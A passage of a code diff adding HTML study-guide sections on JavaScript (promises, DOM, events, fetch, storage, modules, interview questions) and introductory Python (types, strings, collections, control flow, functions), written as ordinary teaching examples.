+// Nested destructuring
+const { data: { users: [firstUser, ...otherUsers] } } = apiResponse;
+
+// Mixed
+const [{ name }, { age }] = [{ name: "Alice" }, { age: 25 }];
+</code></pre>
+
+`,
+  "study-guide-js-14": `
+<h2>14. Promises and Async/Await</h2>
+<pre><code>// Promise basics
+const promise = new Promise((resolve, reject) =&gt; {
+  setTimeout(() =&gt; {
+    if (Math.random() &gt; 0.5) {
+      resolve("Success!");
+    } else {
+      reject(new Error("Failed!"));
+    }
+  }, 1000);
+});
+
+// Consuming promises
+promise
+  .then(result =&gt; console.log(result))
+  .catch(error =&gt; console.error(error))
+  .finally(() =&gt; console.log("Always runs"));
+
+// Chaining
+fetch("/api/user")
+  .then(res =&gt; res.json())
+  .then(data =&gt; data.name)
+  .then(name =&gt; console.log(name))
+  .catch(err =&gt; console.error(err));
+
+// Promise combinators
+Promise.all([p1, p2, p3])        // All must succeed; rejects if any fail
+Promise.allSettled([p1, p2, p3]) // Wait for all; get all results
+Promise.race([p1, p2, p3])       // First to resolve/reject wins
+Promise.any([p1, p2, p3])        // First to RESOLVE wins; rejects if ALL fail
+
+// Async/Await (syntactic sugar over Promises)
+async function fetchUser(id) {
+  try {
+    const response = await fetch(\`/api/users/\${id}\`);
+    if (!response.ok) throw new Error(\`HTTP error! status: \${response.status}\`);
+    const data = await response.json();
+    return data;
+  } catch (error) {
+    console.error("Error fetching user:", error);
+    throw error;  // Re-throw if caller needs to handle it
+  } finally {
+    console.log("Request completed");
+  }
+}
+
+// Parallel async operations
+async function loadDashboard(userId) {
+  // Sequential (slower)
+  const user = await fetchUser(userId);
+  const posts = await fetchPosts(userId);
+
+  // Parallel (faster)
+  const [user2, posts2] = await Promise.all([
+    fetchUser(userId),
+    fetchPosts(userId)
+  ]);
+}
+
+// Async IIFE
+(async () =&gt; {
+  const data = await fetchUser(1);
+  console.log(data);
+})();
+
+// For-await-of (async iteration)
+async function processStream(stream) {
+  for await (const chunk of stream) {
+    process(chunk);
+  }
+}
+</code></pre>
+
+`,
+  "study-guide-js-15": `
+<h2>15. Error Handling</h2>
+<pre><code>// try / catch / finally
+try {
+  const result = JSON.parse(invalidJSON);
+  riskyOperation();
+} catch (error) {
+  if (error instanceof SyntaxError) {
+    console.error("JSON parse error:", error.message);
+  } else if (error instanceof TypeError) {
+    console.error("Type error:", error.message);
+  } else {
+    console.error("Unknown error:", error);
+  }
+} finally {
+  cleanup();
+}
+
+// Error types
+new Error("Generic error");
+new TypeError("Wrong type");
+new RangeError("Out of range");
+new ReferenceError("Variable doesn't exist");
+new SyntaxError("Invalid syntax");
+new URIError("Malformed URI");
+
+// Custom errors
+class ValidationError extends Error {
+  constructor(message, field) {
+    super(message);
+    this.name = "ValidationError";
+    this.field = field;
+  }
+}
+
+class NetworkError extends Error {
+  constructor(message, statusCode) {
+    super(message);
+    this.name = "NetworkError";
+    this.statusCode = statusCode;
+  }
+}
+
+// Throwing
+function divide(a, b) {
+  if (b === 0) throw new RangeError("Cannot divide by zero");
+  return a / b;
+}
+</code></pre>
+
+`,
+  "study-guide-js-16": `
+<h2>16. DOM Manipulation</h2>
+<pre><code>// Selecting elements
+document.getElementById("myId")              // One element
+document.querySelector(".my-class")          // First match (CSS selector)
+document.querySelectorAll("p.highlight")     // All matches (NodeList)
+document.querySelector("ul &gt; li:first-child")
+
+document.getElementsByClassName("card")      // HTMLCollection (live)
+document.getElementsByTagName("div")
+
+// Traversal
+element.parentElement
+element.children             // Child elements (HTMLCollection)
+element.firstElementChild
+element.lastElementChild
+element.nextElementSibling
+element.previousElementSibling
+element.closest(".container") // Nearest ancestor matching selector
+
+// Creating and inserting
+const div = document.createElement("div");
+div.className = "card";
+div.textContent = "Hello";
+div.innerHTML = "&lt;strong&gt;Hello&lt;/strong&gt;";
+
+document.body.appendChild(div);
+document.body.prepend(div);
+parent.insertBefore(div, referenceElement);
+parent.replaceChild(newEl, oldEl);
+
+// Modern insertion
+element.append(div, "text")         // After last child (accepts multiple)
+element.prepend(div)                // Before first child
+element.before(div)                 // Before element
+element.after(div)                  // After element
+element.replaceWith(div)
+
+// Template literals for HTML
+parent.innerHTML = \`
+  &lt;div class="card"&gt;
+    &lt;h2&gt;\${user.name}&lt;/h2&gt;
+    &lt;p&gt;\${user.bio}&lt;/p&gt;
+  &lt;/div&gt;
+\`;
+
+// Removing
+element.remove();
+parent.removeChild(element);
+
+// Attributes
+element.getAttribute("href")
+element.setAttribute("href", "/new-url")
+element.removeAttribute("disabled")
+element.hasAttribute("hidden")
+
+// Dataset (data-* attributes)
+// &lt;div data-user-id="42" data-role="admin"&gt;
+element.dataset.userId   // "42"
+element.dataset.role     // "admin"
+element.dataset.newKey = "value"  // Creates data-new-key attribute
+
+// Classes
+element.classList.add("active", "highlighted")
+element.classList.remove("active")
+element.classList.toggle("visible")
+element.classList.contains("active")   // boolean
+element.classList.replace("old", "new")
+element.className      // All classes as string
+
+// Styles
+element.style.color = "red";
+element.style.backgroundColor = "blue";
+element.style.cssText = "color: red; font-size: 16px;";
+getComputedStyle(element).color   // Actual computed value
+
+// Content
+element.textContent    // Text content (safe from XSS)
+element.innerHTML      // HTML content (be careful with user input!)
+element.innerText      // Rendered text (respects CSS visibility)
+element.outerHTML      // Element + its HTML
+
+// Dimensions
+element.offsetWidth     // Width including border
+element.offsetHeight
+element.clientWidth     // Width including padding, no border
+element.clientHeight
+element.scrollWidth     // Full scroll width
+element.scrollHeight
+element.getBoundingClientRect()  // Returns DOMRect {top, right, bottom, left, width, height}
+</code></pre>
+
+`,
+  "study-guide-js-17": `
+<h2>17. Events</h2>
+<pre><code>// Adding event listeners
+element.addEventListener("click", handler);
+element.addEventListener("click", handler, { once: true });   // Fire once
+element.addEventListener("click", handler, { passive: true }); // Scroll perf
+element.addEventListener("click", handler, true);             // Capture phase
+
+// Removing (must reference same function!)
+element.removeEventListener("click", handler);
+
+// Event object
+element.addEventListener("click", (event) =&gt; {
+  event.target          // Element that triggered event
+  event.currentTarget   // Element listener is attached to
+  event.type            // "click"
+  event.timestamp       // Time event fired
+  event.preventDefault()  // Prevent default behavior (form submit, link follow)
+  event.stopPropagation()  // Stop bubbling up the DOM
+  event.stopImmediatePropagation()  // Stop other listeners on same element
+
+  // Mouse events
+  event.clientX, event.clientY   // Position relative to viewport
+  event.pageX, event.pageY       // Position relative to document
+  event.offsetX, event.offsetY   // Position relative to element
+  event.button      // 0=left, 1=middle, 2=right
+  event.buttons     // Bitmask
+  event.ctrlKey     // boolean
+  event.shiftKey    // boolean
+  event.altKey      // boolean
+  event.metaKey     // Cmd on Mac
+
+  // Keyboard events
+  event.key         // "a", "Enter", "ArrowLeft"
+  event.code        // "KeyA", "Enter", "ArrowLeft"
+  event.keyCode     // Deprecated
+
+  // Form events
+  event.target.value   // Input value
+});
+
+// Common events
+"click", "dblclick", "mousedown", "mouseup", "mouseover",
+"mouseout", "mousemove", "mouseenter", "mouseleave",
+"keydown", "keyup", "keypress",
+"focus", "blur", "focusin", "focusout",
+"input", "change", "submit", "reset",
+"scroll", "resize", "load", "DOMContentLoaded",
+"unload", "beforeunload",
+"dragstart", "drag", "dragend", "dragover", "drop",
+"touchstart", "touchend", "touchmove",
+"pointerdown", "pointerup", "pointermove",
+"transitionend", "animationend",
+"contextmenu"
+
+// Event delegation (handle child events on parent)
+document.querySelector("ul").addEventListener("click", (e) =&gt; {
+  if (e.target.matches("li")) {
+    console.log("Clicked:", e.target.textContent);
+  }
+});
+
+// Custom events
+const event = new CustomEvent("userLogin", {
+  detail: { userId: 42 },
+  bubbles: true,
+  cancelable: true
+});
+element.dispatchEvent(event);
+
+element.addEventListener("userLogin", (e) =&gt; {
+  console.log("User logged in:", e.detail.userId);
+});
+
+// DOMContentLoaded vs load
+document.addEventListener("DOMContentLoaded", () =&gt; {
+  // HTML parsed and DOM ready (no images/stylesheets needed)
+});
+window.addEventListener("load", () =&gt; {
+  // Everything (images, stylesheets) fully loaded
+});
+</code></pre>
+
+`,
+  "study-guide-js-18": `
+<h2>18. Fetch API and HTTP Requests</h2>
+<pre><code>// Basic GET
+const response = await fetch("https://api.example.com/data");
+const data = await response.json();
+
+// Full fetch with options
+const response = await fetch("https://api.example.com/users", {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/json",
+    "Authorization": "Bearer " + token,
+    "Accept": "application/json"
+  },
+  body: JSON.stringify({
+    name: "Alice",
+    email: "alice@example.com"
+  }),
+  credentials: "include",    // Send cookies
+  cache: "no-cache",
+  signal: controller.signal  // For cancellation
+});
+
+// Check response
+if (!response.ok) {
+  throw new Error(\`HTTP error! status: \${response.status}\`);
+}
+
+// Response methods
+response.json()      // Parse JSON body
+response.text()      // Get body as text
+response.blob()      // Get body as Blob (binary data)
+response.formData()  // Get body as FormData
+response.arrayBuffer() // Get body as ArrayBuffer
+
+response.status        // 200, 404, 500...
+response.statusText    // "OK", "Not Found"...
+response.headers       // Headers object
+response.url           // Final URL (after redirects)
+response.redirected    // true if redirected
+
+// Abort request
+const controller = new AbortController();
+setTimeout(() =&gt; controller.abort(), 5000);  // Timeout after 5s
+
+try {
+  const response = await fetch(url, { signal: controller.signal });
+} catch (err) {
+  if (err.name === "AbortError") console.log("Request cancelled");
+}
+
+// Form data
+const formData = new FormData(formElement);
+// or
+const formData = new FormData();
+formData.append("name", "Alice");
+formData.append("file", fileInput.files[0]);
+
+await fetch("/upload", {
+  method: "POST",
+  body: formData  // Don't set Content-Type; browser sets it with boundary
+});
+
+// URL parameters
+const params = new URLSearchParams({ page: 1, limit: 10, search: "hello" });
+const url = \`https://api.example.com/items?\${params}\`;
+// Results in: https://api.example.com/items?page=1&amp;limit=10&amp;search=hello
+</code></pre>
+
+`,
+  "study-guide-js-19": `
+<h2>19. Web Storage</h2>
+<pre><code>// localStorage: persists across sessions
+localStorage.setItem("key", "value");
+localStorage.setItem("user", JSON.stringify({ name: "Alice", age: 25 }));
+localStorage.getItem("key")          // "value"
+JSON.parse(localStorage.getItem("user"))  // { name: "Alice", age: 25 }
+localStorage.removeItem("key")
+localStorage.clear()
+localStorage.length
+localStorage.key(0)   // Get key by index
+
+// sessionStorage: cleared when tab closes
+sessionStorage.setItem("token", "abc123");
+sessionStorage.getItem("token");
+sessionStorage.removeItem("token");
+
+// Storage event (cross-tab communication)
+window.addEventListener("storage", (e) =&gt; {
+  console.log(e.key, e.oldValue, e.newValue, e.url);
+});
+
+// Utility functions
+function saveToStorage(key, data) {
+  try {
+    localStorage.setItem(key, JSON.stringify(data));
+  } catch (e) {
+    console.error("Storage full:", e);
+  }
+}
+
+function loadFromStorage(key, defaultValue = null) {
+  try {
+    const item = localStorage.getItem(key);
+    return item ? JSON.parse(item) : defaultValue;
+  } catch (e) {
+    return defaultValue;
+  }
+}
+</code></pre>
+
+`,
+  "study-guide-js-20": `
+<h2>20. Modules (ES Modules)</h2>
+<pre><code>// math.js — exporting
+export const PI = 3.14159;
+
+export function add(a, b) { return a + b; }
+export function subtract(a, b) { return a - b; }
+
+export default class Calculator {
+  // ...
+}
+
+// Named and default together
+export { add, subtract };
+export default Calculator;
+
+// app.js — importing
+import Calculator from "./math.js";           // Default import
+import { add, subtract } from "./math.js";    // Named imports
+import { add as sum } from "./math.js";       // Renamed
+import * as Math from "./math.js";            // Namespace import
+import Calculator, { PI, add } from "./math.js"; // Both
+
+// Dynamic import (lazy loading)
+const module = await import("./heavy-module.js");
+module.default.doSomething();
+
+// Re-exporting
+export { add, subtract } from "./math.js";
+export { default } from "./calculator.js";
+export * from "./utils.js";
+</code></pre>
+
+`,
+  "study-guide-js-21": `
+<h2>21. Iterators and Generators</h2>
+<pre><code>// Iterator protocol
+const range = {
+  [Symbol.iterator]() {
+    let current = this.start;
+    const end = this.end;
+    return {
+      next() {
+        if (current &lt;= end) {
+          return { value: current++, done: false };
+        }
+        return { value: undefined, done: true };
+      }
+    };
+  },
+  start: 1,
+  end: 5
+};
+
+for (const num of range) console.log(num);  // 1 2 3 4 5
+
+// Generator functions
+function* count(start = 0, step = 1) {
+  let current = start;
+  while (true) {
+    const reset = yield current;
+    if (reset) {
+      current = start;
+    } else {
+      current += step;
+    }
+  }
+}
+
+const counter = count(10, 2);
+counter.next()         // { value: 10, done: false }
+counter.next()         // { value: 12, done: false }
+counter.next(true)     // { value: 10, done: false } — reset
+</code></pre>
+
+`,
+  "study-guide-js-22": `
+<h2>22. Common Interview Questions</h2>
+<p><strong>Q: What is the difference between <code>var</code>, <code>let</code>, and <code>const</code>?</strong>
+A: <code>var</code> is function-scoped and hoisted (initialized as <code>undefined</code>). <code>let</code> and <code>const</code> are block-scoped and in the "temporal dead zone" before declaration. <code>const</code> cannot be reassigned. Use <code>const</code> by default, <code>let</code> when you need to reassign, avoid <code>var</code>.</p>
+<p><strong>Q: Explain the event loop.</strong>
+A: JS is single-threaded. The event loop checks the call stack and, when empty, moves tasks from the callback queue to the stack. Promises use the microtask queue which is drained before the macrotask queue.</p>
+<p><strong>Q: What is closure?</strong>
+A: A function that remembers the variables from its outer scope even after the outer function has returned. Used for data privacy, factories, and memoization.</p>
+<p><strong>Q: What is <code>this</code> in JavaScript?</strong>
+A: In a regular function, <code>this</code> is the calling object (dynamic). In arrow functions, <code>this</code> is lexically inherited from the surrounding scope. In strict mode, <code>this</code> is <code>undefined</code> if no calling object.</p>
+<p><strong>Q: What is the difference between <code>==</code> and <code>===</code>?</strong>
+A: <code>==</code> performs type coercion; <code>===</code> does not. <code>"5" == 5</code> is <code>true</code>; <code>"5" === 5</code> is <code>false</code>. Always use <code>===</code>.</p>
+<p><strong>Q: What is a Promise?</strong>
+A: An object representing the eventual completion or failure of an async operation. States: pending, fulfilled, rejected. Can be chained with <code>.then()/.catch()</code> or used with <code>async/await</code>.</p>
+<p><strong>Q: What is event delegation?</strong>
+A: Attaching a single event listener to a parent element to handle events from all current and future child elements. Efficient for dynamic content.</p>
+
+<p><em>End of JavaScript Study Guide</em></p>
+
+`,
+  "study-guide-python-01": `
+<h2>1. What Is Python?</h2>
+<p>Python is a <strong>high-level, interpreted, dynamically typed, general-purpose</strong> programming language. Created by Guido van Rossum (1991). Its design philosophy emphasizes code readability (uses indentation instead of braces) and simplicity ("one obvious way to do it").</p>
+<p>Use cases: web development, data science, machine learning, automation, scripting, scientific computing, DevOps, security tools.</p>
+
+`,
+  "study-guide-python-02": `
+<h2>2. Python Setup and Running Code</h2>
+<pre><code># Check version
+python --version      # Python 3.x.x
+python3 --version
+
+# Interactive interpreter (REPL)
+python3
+
+# Run a script
+python3 script.py
+
+# Virtual environments (isolate project dependencies)
+python3 -m venv venv           # Create venv
+source venv/bin/activate        # Activate (Linux/Mac)
+venv\\Scripts\\activate          # Activate (Windows)
+deactivate                      # Leave venv
+
+# Package manager
+pip install requests
+pip install -r requirements.txt
+pip list
+pip freeze &gt; requirements.txt
+</code></pre>
+
+`,
+  "study-guide-python-03": `
+<h2>3. Variables and Data Types</h2>
+<pre><code># Variables — no type declaration needed
+name = "Alice"
+age = 25
+height = 5.9
+is_active = True
+data = None
+
+# Multiple assignment
+x = y = z = 0
+a, b, c = 1, 2, 3
+a, b = b, a    # Swap values
+
+# Type checking
+type(name)         # &lt;class 'str'&gt;
+type(age)          # &lt;class 'int'&gt;
+isinstance(age, int)         # True
+isinstance(name, (str, int)) # True — check multiple types
+
+# Type conversion
+int("42")          # 42
+int(3.9)           # 3 (truncates)
+float("3.14")      # 3.14
+str(42)            # "42"
+bool(0)            # False
+bool("")           # False
+bool(None)         # False
+bool([])           # False
+# Everything else is truthy
+
+list("hello")      # ['h','e','l','l','o']
+tuple([1,2,3])     # (1, 2, 3)
+set([1,2,2,3])     # {1, 2, 3}
+dict([("a",1),("b",2)])  # {'a': 1, 'b': 2}
+</code></pre>
+
+`,
+  "study-guide-python-04": `
+<h2>4. Numbers</h2>
+<pre><code># Integer
+x = 42
+big = 1_000_000    # Underscores for readability
+binary = 0b1010    # 10 in binary
+octal = 0o17       # 15 in octal
+hex_val = 0xFF     # 255 in hex
+
+# Float
+f = 3.14
+scientific = 1.5e-3   # 0.0015
+
+# Complex
+c = 3 + 4j
+c.real   # 3.0
+c.imag   # 4.0
+
+# Arithmetic
+10 / 3     # 3.3333... (true division)
+10 // 3    # 3 (floor division)
+10 % 3     # 1 (modulo)
+2 ** 10    # 1024 (exponent)
+-7 // 2    # -4 (floors toward negative infinity!)
+-7 % 2     # 1
+
+# Math module
+import math
+math.pi              # 3.14159...
+math.e               # 2.71828...
+math.sqrt(16)        # 4.0
+math.floor(3.7)      # 3
+math.ceil(3.2)       # 4
+math.factorial(5)    # 120
+math.gcd(12, 8)      # 4
+math.log(100, 10)    # 2.0
+math.sin(math.pi/2)  # 1.0
+math.inf             # Infinity
+math.nan             # NaN
+math.isnan(x)
+math.isinf(x)
+
+# abs, round, divmod, pow
+abs(-5)              # 5
+round(3.14159, 2)    # 3.14
+round(2.5)           # 2 (banker's rounding!)
+round(3.5)           # 4
+divmod(10, 3)        # (3, 1) — quotient and remainder
+pow(2, 10)           # 1024
+pow(2, 10, 1000)     # 24 (modular exponentiation)
+
+# Decimal for precision
+from decimal import Decimal
+Decimal("0.1") + Decimal("0.2")  # Decimal('0.3') — precise!
+
+# Fractions
+from fractions import Fraction
+Fraction(1, 3)   # Fraction(1, 3)
+Fraction(1, 3) + Fraction(1, 6)  # Fraction(1, 2)
+</code></pre>
+
+`,
+  "study-guide-python-05": `
+<h2>5. Strings</h2>
+<pre><code># Creation
+s = "Hello, World!"
+s = 'Single quotes'
+s = """Triple double
+       quotes for multiline"""
+s = '''Triple single quotes'''
+raw = r"Raw string: \\n is literal"
+byte = b"Byte string"
+formatted = f"2 + 2 = {2 + 2}"
+
+# F-strings (Python 3.6+)
+name = "Alice"
+age = 25
+f"{name.upper()}"         # "ALICE"
+f"{age:&gt;10}"              # Right-align in width 10
+f"{age:0&gt;10}"             # Pad with zeros: 0000000025
+f"{3.14159:.2f}"          # "3.14" — 2 decimal places
+f"{1000000:,}"            # "1,000,000" — thousands separator
+f"{name!r}"               # "'Alice'" — repr()
+f"{name!s}"               # "Alice" — str()
+f"{name!a}"               # ASCII repr
+
+# String methods
+s = "  Hello, World!  "
+s.upper()             # "  HELLO, WORLD!  "
+s.lower()
+s.title()             # "  Hello, World!  "
+s.strip()             # "Hello, World!"
+s.lstrip()            # "Hello, World!  "
+s.rstrip()            # "  Hello, World!"
+s.replace("World", "Python")  # "  Hello, Python!  "
+s.split(", ")         # ['  Hello', 'World!  ']
+s.split()             # Split on whitespace: ['Hello,', 'World!']
+s.splitlines()        # Split on newlines
+", ".join(["a","b","c"])  # "a, b, c"
+s.find("World")       # 8 (index) or -1 if not found
+s.index("World")      # 8 or raises ValueError
+s.count("l")          # 3
+s.startswith("  H")   # True
+s.endswith("  ")      # True
+s.strip().startswith("H")  # True
+s.isdigit()           # False
+s.isalpha()           # False
+s.isalnum()           # False
+s.isspace()           # False
+s.isupper()           # False
+s.islower()           # False
+s.center(30, "*")     # Pad with * to width 30
+s.zfill(20)           # Pad with zeros on left
+s.expandtabs(4)       # Replace \\t with spaces
+s.encode("utf-8")     # Convert to bytes
+b"hello".decode("utf-8")  # Convert from bytes
+
+# Slicing
+s = "Hello, World!"
+s[0]      # 'H'
+s[-1]     # '!'
+s[7:12]   # 'World'
+s[:5]     # 'Hello'
+s[7:]     # 'World!'
+s[::2]    # Every other char: 'HloWrd'
+s[::-1]   # Reversed: '!dlroW ,olleH'
+s[2:10:2] # Start at 2, end at 10, step 2: 'lo o'
+
+# Immutability: strings cannot be modified in place
+# s[0] = "h"  # TypeError!
+
+# String formatting (old styles)
+"%s is %d years old" % (name, age)
+"{} is {} years old".format(name, age)
+"{name} is {age}".format(name=name, age=age)
+
+# Useful string functions
+len(s)            # Length
+ord("A")          # 65 (Unicode code point)
+chr(65)           # "A"
+"hello" * 3       # "hellohellohello"
+"Hello" in s      # True
+
+# Multiline strings
+query = """
+    SELECT *
+    FROM users
+    WHERE active = 1
+"""
+</code></pre>
+
+`,
+  "study-guide-python-06": `
+<h2>6. Lists</h2>
+<pre><code># Creation
+lst = [1, 2, 3, 4, 5]
+lst = list(range(1, 6))
+lst = list("hello")       # ['h','e','l','l','o']
+empty = []
+
+# Access
+lst[0]     # 1 (first)
+lst[-1]    # 5 (last)
+lst[1:3]   # [2, 3] (slice)
+lst[::2]   # [1, 3, 5] (every other)
+lst[::-1]  # [5, 4, 3, 2, 1] (reversed)
+
+# Modifying
+lst.append(6)           # Add to end
+lst.extend([7, 8])      # Add multiple
+lst.insert(0, 0)        # Insert at index
+lst.remove(3)           # Remove FIRST occurrence of value
+popped = lst.pop()      # Remove and return last
+popped = lst.pop(1)     # Remove and return at index
+lst.clear()             # Remove all
+lst[1] = 99             # Modify by index
+lst[1:3] = [10, 20]     # Replace slice
+
+# Non-modifying
+lst.index(3)            # Find index (raises ValueError if not found)
+lst.count(3)            # Count occurrences
+3 in lst                # True/False membership test
+len(lst)                # Length
+sorted(lst)             # Return sorted list (new)
+reversed(lst)           # Return iterator
+lst.copy()              # Shallow copy
+list(lst)               # Shallow copy
+lst[:]                  # Shallow copy
+
+# Modifying in-place
+lst.sort()                         # Sort ascending
+lst.sort(reverse=True)             # Sort descending
+lst.sort(key=len)                  # Sort by key
+lst.sort(key=lambda x: x.lower()) # Sort case-insensitive
+lst.reverse()                      # Reverse in place
+
+# List comprehensions
+squares = [x**2 for x in range(10)]
+evens = [x for x in range(20) if x % 2 == 0]
+flat = [n for row in matrix for n in row]
+pairs = [(x, y) for x in range(3) for y in range(3)]
+words = [word.upper() for word in sentence.split() if len(word) &gt; 3]
+
+# Nested lists
+matrix = [[1,2,3],[4,5,6],[7,8,9]]
+matrix[1][2]    # 6
+transposed = [[row[i] for row in matrix] for i in range(3)]
+
+# Useful operations
+max(lst), min(lst), sum(lst)
+all(x &gt; 0 for x in lst)  # True if all positive
+any(x &lt; 0 for x in lst)  # True if any negative
+zip([1,2,3], ["a","b","c"])  # [(1,"a"), (2,"b"), (3,"c")]
+enumerate(lst)               # [(0,item1), (1,item2), ...]
+enumerate(lst, start=1)      # Start index at 1
+</code></pre>
+
+`,
+  "study-guide-python-07": `
+<h2>7. Tuples</h2>
+<pre><code># Tuples: ordered, immutable sequences
+t = (1, 2, 3)
+single = (42,)        # Note comma! (42) is just 42
+empty = ()
+t = 1, 2, 3           # Parens optional
+
+# All list READ methods work
+t[0], t[-1], t[1:3]
+len(t), t.count(2), t.index(2)
+2 in t
+
+# Unpacking
+a, b, c = (1, 2, 3)
+first, *rest = (1, 2, 3, 4, 5)      # first=1, rest=[2,3,4,5]
+*head, last = (1, 2, 3, 4, 5)       # head=[1,2,3,4], last=5
+a, _, b = (1, 2, 3)                 # _ discards middle
+
+# Named tuples (like lightweight classes)
+from collections import namedtuple
+Point = namedtuple("Point", ["x", "y"])
+p = Point(10, 20)
+p.x         # 10
+p.y         # 20
+p[0]        # 10 (also indexable)
+p._asdict() # {'x': 10, 'y': 20}
+
+# When to use tuples vs lists
+# Tuples: fixed data, keys in dicts, function returns, unpacking
+# Lists: mutable sequences, homogeneous data
+</code></pre>
+
+`,
+  "study-guide-python-08": `
+<h2>8. Dictionaries</h2>
+<pre><code># Creation
+d = {"name": "Alice", "age": 25}
+d = dict(name="Alice", age=25)
+d = dict([("name", "Alice"), ("age", 25)])
+d = {i: i**2 for i in range(5)}  # Dict comprehension
+
+# Access
+d["name"]              # "Alice" — KeyError if missing
+d.get("name")          # "Alice" — None if missing
+d.get("email", "N/A")  # "N/A" — default if missing
+
+# Modification
+d["email"] = "alice@example.com"   # Add or update
+d.update({"city": "NYC", "age": 26})  # Update multiple
+d.update(city="NYC")
+
+# Deletion
+del d["email"]
+removed = d.pop("age")       # Remove and return value
+removed = d.pop("x", None)   # With default (no error)
+d.clear()                    # Remove all
+
+# Check existence
+"name" in d          # True
+"name" not in d      # False
+
+# Iteration
+for key in d:                    # Iterate keys
+    print(key, d[key])
+
+for key in d.keys():             # Explicit keys
+for value in d.values():         # Values
+for key, value in d.items():     # Key-value pairs
+
+# Views (live, reflect changes)
+d.keys()     # dict_keys(['name', 'age'])
+d.values()   # dict_values(['Alice', 25])
+d.items()    # dict_items([('name','Alice'),('age',25)])
+
+# Useful methods
+d.setdefault("score", 0)    # Set key if missing; return value
+d.copy()                    # Shallow copy
+
+# Merging
+merged = {**d1, **d2}        # d2 overwrites d1 on conflicts (Python 3.5+)
+merged = d1 | d2             # Python 3.9+ pipe operator
+d1 |= d2                     # Update in place
+
+# Dict comprehensions
+word_lengths = {word: len(word) for word in words}
+filtered = {k: v for k, v in d.items() if v &gt; 0}
+inverted = {v: k for k, v in d.items()}
+
+# defaultdict (auto-creates missing keys)
+from collections import defaultdict
+word_count = defaultdict(int)
+for word in words:
+    word_count[word] += 1
+
+groups = defaultdict(list)
+for item in items:
+    groups[item.category].append(item)
+
+# Counter (special dict for counting)
+from collections import Counter
+c = Counter("aababcabcd")
+c.most_common(3)      # [('a', 4), ('b', 3), ('c', 2)]
+c.total()             # Sum of all counts
+Counter([1,2,2,3]) + Counter([1,2])  # Combine counts
+
+# OrderedDict (pre 3.7 — now regular dict maintains order)
+from collections import OrderedDict
+
+# ChainMap (search multiple dicts without merging)
+from collections import ChainMap
+chain = ChainMap(user_config, default_config)
+chain["key"]  # Found in user_config first
+</code></pre>
+
+`,
+  "study-guide-python-09": `
+<h2>9. Sets</h2>
+<pre><code># Creation (no duplicates, unordered)
+s = {1, 2, 3, 4}
+s = set([1, 2, 2, 3])    # {1, 2, 3}
+s = set("hello")          # {'h', 'e', 'l', 'o'}
+empty = set()             # NOT {} (that's a dict!)
+
+# Operations
+s.add(5)              # Add single element
+s.update([5, 6, 7])   # Add multiple
+s.discard(3)          # Remove (no error if absent)
+s.remove(3)           # Remove (KeyError if absent)
+popped = s.pop()      # Remove and return arbitrary element
+
+3 in s                # Membership test O(1)
+len(s)
+
+# Set math
+a = {1, 2, 3, 4}
+b = {3, 4, 5, 6}
+
+a | b         # Union: {1,2,3,4,5,6}
+a.union(b)
+
+a &amp; b         # Intersection: {3,4}
+a.intersection(b)
+
+a - b         # Difference (in a but not b): {1,2}
+a.difference(b)
+
+a ^ b         # Symmetric difference (in either but not both): {1,2,5,6}
+a.symmetric_difference(b)
+
+a.issubset(b)          # All of a in b?
+a.issuperset(b)        # All of b in a?
+a.isdisjoint(b)        # No common elements?
+
+a &lt;= b    # Subset
+a &lt; b     # Proper subset (subset but not equal)
+a &gt;= b    # Superset
+a &gt; b     # Proper superset
+
+# Set comprehension
+squares = {x**2 for x in range(10)}
+
+# frozenset (immutable set — can be a dict key)
+fs = frozenset([1, 2, 3])
+</code></pre>
+
+`,
+  "study-guide-python-10": `
+<h2>10. Control Flow</h2>
+<pre><code># if / elif / else
+score = 85
+if score &gt;= 90:
+    grade = "A"
+elif score &gt;= 80:
+    grade = "B"
+elif score &gt;= 70:
+    grade = "C"
+else:
+    grade = "F"
+
+# Ternary (conditional expression)
+grade = "Pass" if score &gt;= 60 else "Fail"
+
+# match statement (Python 3.10+ — structural pattern matching)
+match command:
+    case "quit" | "exit":
+        quit()
+    case "help":
+        show_help()
+    case str(x) if x.startswith("go "):
+        move(x[3:])
+    case {"action": action, "target": target}:
+        handle(action, target)
+    case [x, y]:
+        move_to(x, y)
+    case _:
+        print("Unknown command")
+
+# for loop
+for i in range(10):        # 0-9
+    print(i)
+
+for i in range(0, 10, 2):  # 0, 2, 4, 6, 8
+    print(i)
+
+for i in range(10, 0, -1): # 10, 9, 8... 1
+    print(i)
+
+for item in ["a", "b", "c"]:
+    if item == "b":
+        continue   # Skip
+    if item == "c":
+        break      # Exit
+    print(item)
+else:
+    # Runs only if loop completed without break
+    print("Done!")
+
+# for with enumerate and zip
+for i, value in enumerate(["a", "b", "c"], start=1):
+    print(f"{i}: {value}")
+
+for name, age in zip(names, ages):
+    print(f"{name}: {age}")
+
+# While loop
+n = 0
+while n &lt; 10:
+    n += 1
+else:
+    print("Finished!")
+
+# Walrus operator (Python 3.8+) — assign and test
+while chunk := file.read(1024):
+    process(chunk)
+
+data = [y := f(x), y**2, y**3]
+
+# Pass (placeholder)
+if condition:
+    pass   # TODO: implement
+</code></pre>
+
+`,
+  "study-guide-python-11": `
+<h2>11. Functions</h2>
+<pre><code># Basic function
+def greet(name):
+    """Docstring explaining function."""
+    return f"Hello, {name}!"
+
+# Default arguments
+def create_user(name, role="user", active=True):
+    return {"name": name, "role": role, "active": active}
+
+# *args (variable positional)
+def sum_all(*args):
+    return sum(args)
+sum_all(1, 2, 3, 4, 5)   # 15
+
+# **kwargs (variable keyword)
+def build_tag(tag, **attrs):
+    attr_str = " ".join(f'{k}="{v}"' for k, v in attrs.items())
+    return f"&lt;{tag} {attr_str}&gt;"
+
+build_tag("a", href="/home", class_="nav")
+
+# Keyword-only arguments
+def func(pos, /, normal, *, kw_only):
+    """
+    pos: positional only (before /)
+    normal: positional or keyword
+    kw_only: keyword only (after *)
+    """
+
+# Unpacking in calls
+args = [1, 2, 3]
+func(*args)          # Unpack as positional
+kwargs = {"a": 1}
+func(**kwargs)       # Unpack as keyword
+
+# Lambda (anonymous function)
+square = lambda x: x**2
+double = lambda x: x * 2
+add = lambda x, y: x + y
+sorted(items, key=lambda x: x.price)
+
+# Returning multiple values
+def min_max(lst):
+    return min(lst), max(lst)   # Returns tuple
+
+lo, hi = min_max([3,1,4,1,5])
+
+# Type hints (Python 3.5+, not enforced at runtime)
+def greet(name: str, times: int = 1) -&gt; str:
+    return (f"Hello, {name}! " * times).strip()
+
+from typing import List, Dict, Optional, Union, Tuple, Any
+def process(data: List[int]) -&gt; Dict[str, int]:
+    pass
+def maybe(x: Optional[str] = None) -&gt; None:
+    pass
